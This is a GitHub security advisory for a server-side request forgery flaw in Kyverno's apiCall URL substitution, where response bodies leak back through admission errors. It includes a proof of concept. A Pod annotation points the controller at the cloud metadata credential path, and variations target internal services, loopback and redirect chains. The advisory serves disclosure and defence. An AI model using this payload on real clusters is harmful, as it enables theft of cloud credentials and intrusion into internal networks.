# [H] Kyverno has unrestricted outbound requests in Kyverno apiCall enabling SSRF

## Summary
Severity: High
Advisory: GHSA-qr4g-8hrp-c4rw
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-qr4g-8hrp-c4rw
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=0

## Details
### Summary
A Server-Side Request Forgery (SSRF) vulnerability in Kyverno allows authenticated users to induce the admission controller to send arbitrary HTTP requests to attacker-controlled endpoints.

When a `ClusterPolicy` uses `apiCall.service.url` with variable substitution (e.g. `{{request.object.*}}`), user-controlled input can influence the request target. The Kyverno admission controller executes these requests from its privileged network position without enforcing any validation or network restrictions.

The issue becomes **non-blind SSRF**, as response data from internal services can be reflected back to the user via admission error messages.

---

### Details

Kyverno supports variable substitution in `apiCall.service.url`, a documented feature intended to enable dynamic external lookups during admission control.

However, the current implementation lacks fundamental safeguards in the HTTP execution path:

#### Missing protections

- **No URL validation**  
  User-controlled input is directly embedded into the request URL without validation or normalization.

- **No IP filtering**  
  Requests can target:
  - Loopback (`127.0.0.1`)
  - Link-local (`169.254.0.0/16`)
  - Cloud metadata services (e.g. AWS IMDS)
  - Internal ClusterIP services

- **Redirect handling not restricted**  
  The Go HTTP client uses default redirect behavior (`CheckRedirect == nil`), allowing up to 10 redirects without re-validation of the target.

- **Response data reflection in admission errors**  
  Response bodies are propagated back to the user in admission responses under certain conditions.

#### Non-blind SSRF behavior

The vulnerability is **non-blind** through two mechanisms:

1. **Non-2xx responses**  
   Response body is returned in admission error messages (e.g. `executor.go:98-101`)

2. **2xx responses with non-JSON content**  
   Parsing failures (JSON/JMESPath) include response snippets in error output

This allows attackers to retrieve data from internal services directly via `kubectl` output.

---

### PoC

#### Preconditions

1. A `ClusterPolicy` using:
```yaml
apiCall:
  service:
    url: "http://{{ request.object.metadata.annotations.target }}"
```

2. An authenticated user able to create matching resources (e.g. Pods)

---

#### Step 1 — Create malicious resource

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ssrf-test
  annotations:
    target: "169.254.169.254/latest/meta-data/iam/security-credentials/"
spec:
  containers:
  - name: test
    image: nginx
```

---

#### Step 2 — Apply resource

```bash
kubectl apply -f pod.yaml
```

---

#### Step 3 — Observe output

Example output:

```text
Error from server: admission webhook "kyverno" denied the request:
failed to process apiCall: <response body from metadata service>
```

---

#### Variations

- Internal services:
  http://kubernetes.default.svc
- Loopback:
  http://127.0.0.1:8080
- Redirect chains to bypass naive filters

---

### Impact

#### Vulnerability class
- Server-Side Request Forgery (SSRF)
- Non-blind data exfiltration

#### Affected scope
- Kubernetes clusters using Kyverno policies with `apiCall.service.url` and variable substitution

#### Impact details

- Access to internal services (ClusterIP, localhost)
- Access to cloud metadata endpoints (e.g. IMDSv1 → credential exposure)
- Internal network reconnaissance
- Multi-tenant boundary weakening

This issue can be combined with automatic ServiceAccount token forwarding (reported separately) to form a **critical attack chain**.

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-qr4g-8hrp-c4rw
- https://github.com/kyverno/kyverno
